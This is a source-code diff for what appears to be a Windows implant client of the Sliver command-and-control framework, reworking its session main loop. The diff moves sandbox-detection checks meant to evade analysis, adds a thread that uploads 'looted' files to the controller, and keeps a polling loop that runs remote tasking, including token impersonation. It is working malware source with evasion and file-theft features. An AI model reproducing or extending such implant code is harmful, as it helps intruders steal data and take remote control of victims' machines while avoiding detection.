@@ -248,7 +248,6 @@ CLEANUP:
 }
 
 //VOID SessionLootFile()
-
 VOID SessionMainLoop
 (
 	_In_ PSLIVER_SESSION_CLIENT pSession
@@ -261,9 +260,9 @@ VOID SessionMainLoop
 	DWORD dwNumberOfAttempts = 0;
 	PGLOBAL_CONFIG pConfig = pSession->pGlobalConfig;
 	DWORD i = 0;
-	BOOL IsOk = FALSE;
 	LPVOID* ProfileList = NULL;
 	DWORD cProfiles = 0;
+	DWORD dwThreadID = 0;
 
 	pSliverPool = InitializeSliverThreadPool();
 	if (pSliverPool == NULL) {
@@ -278,13 +277,14 @@ VOID SessionMainLoop
 		goto CLEANUP;
 	}
 	
+#ifndef _DEBUG
+	if (DetectSandbox2() || DetectSandbox3()) {
+		goto CLEANUP;
+	}
+#endif
+
 	for (i = 0; i < cProfiles; i++) {
 		pSession->lpClient = pSession->Init(ProfileList[i]);
-#ifndef _DEBUG
-		if (DetectSandbox2() || DetectSandbox3()) {
-			goto CLEANUP;
-		}
-#endif
 		if (!pSession->Start(pSession->pGlobalConfig, pSession->lpClient)) {
 			goto CONTINUE;
 		}
@@ -293,66 +293,77 @@ VOID SessionMainLoop
 			goto CONTINUE;
 		}
 
-		dwNumberOfAttempts = 0;
-		while (TRUE) {
-#ifndef _DEBUG
-			if (DetectSandbox1() || DetectSandbox2()) {
-				goto CLEANUP;
-			}
-#endif
-			if (dwNumberOfAttempts >= pSession->pGlobalConfig->dwMaxFailure) {
-				goto CONTINUE;
-			}
-
-			pEnvelope = pSession->Receive(pSession->pGlobalConfig, pSession->lpClient);
-			if (pEnvelope == NULL) {
-				dwNumberOfAttempts++;
-				goto SLEEP;
-			}
-
-			dwNumberOfAttempts = 0;
-			if (pEnvelope->uType == 0) {
-				FreeEnvelope(pEnvelope);
-				goto SLEEP;
-			}
-
-#ifdef _DEBUG
-			if (pEnvelope->pData != NULL && pEnvelope->pData->cbBuffer > 0) {
-				PrintFormatW(L"Receive Envelope:\n");
-				if (pEnvelope->pData->cbBuffer > 0x800) {
-					HexDump(pEnvelope->pData->pBuffer, 0x800);
-				}
-				else {
-					HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
-				}
-			}
-			else {
-				PrintFormatW(L"Receive Envelope: []\n");
-			}
-#endif	
-			pWrapper = ALLOC(sizeof(SESSION_WORK_WRAPPER));
-			pWrapper->pSession = pSession;
-			pWrapper->pEnvelope = pEnvelope;
-			if (pEnvelope->uType == MsgMakeTokenReq || pEnvelope->uType == MsgRevToSelfReq || pEnvelope->uType == MsgImpersonateReq) {
-				SessionWork(NULL, pWrapper, NULL);
-			}
-			else {
-				pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)SessionWork, pWrapper, &pSliverPool->CallBackEnviron);
-				TpPostWork(pWork);
-			}
-		SLEEP:
-			Sleep(pSession->dwPollInterval * 1000);
-		}
-
-	CONTINUE:
+CONTINUE:
 		pSession->Close(pSession->lpClient);
 		pSession->Cleanup(pSession->lpClient);
 		pSession->lpClient = NULL;
 	}
 
-CLEANUP:
-	FreeSliverThreadPool(pSliverPool);
+	if (pSession->lpClient == NULL) {
+		goto CLEANUP;
+	}
 
+	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SliverUploadLootedFile, pSession, 0, &dwThreadID);
+
+	dwNumberOfAttempts = 0;
+	while (TRUE) {
+#ifndef _DEBUG
+		if (DetectSandbox1() || DetectSandbox2()) {
+			goto CLEANUP;
+		}
+#endif
+		if (dwNumberOfAttempts >= pSession->pGlobalConfig->dwMaxFailure) {
+			goto CLEANUP;
+		}
+
+		pEnvelope = pSession->Receive(pSession->pGlobalConfig, pSession->lpClient);
+		if (pEnvelope == NULL) {
+			dwNumberOfAttempts++;
+			goto SLEEP;
+		}
+
+		dwNumberOfAttempts = 0;
+		if (pEnvelope->uType == 0) {
+			FreeEnvelope(pEnvelope);
+			goto SLEEP;
+		}
+
+#ifdef _DEBUG
+		if (pEnvelope->pData != NULL && pEnvelope->pData->cbBuffer > 0) {
+			PrintFormatW(L"Receive Envelope:\n");
+			if (pEnvelope->pData->cbBuffer > 0x800) {
+				HexDump(pEnvelope->pData->pBuffer, 0x800);
+			}
+			else {
+				HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
+			}
+		}
+		else {
+			PrintFormatW(L"Receive Envelope: []\n");
+		}
+#endif	
+		pWrapper = ALLOC(sizeof(SESSION_WORK_WRAPPER));
+		pWrapper->pSession = pSession;
+		pWrapper->pEnvelope = pEnvelope;
+		if (pEnvelope->uType == MsgMakeTokenReq || pEnvelope->uType == MsgRevToSelfReq || pEnvelope->uType == MsgImpersonateReq) {
+			SessionWork(NULL, pWrapper, NULL);
+		}
+		else {
+			pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)SessionWork, pWrapper, &pSliverPool->CallBackEnviron);
+			TpPostWork(pWork);
+		}
+	SLEEP:
+		Sleep(pSession->dwPollInterval * 1000);
+	}
+
+CLEANUP:
+	if (pSession->lpClient != NULL) {
+		pSession->Close(pSession->lpClient);
+		pSession->Cleanup(pSession->lpClient);
+		pSession->lpClient = NULL;
+	}
+
+	FreeSliverThreadPool(pSliverPool);
 	return;
 }
 
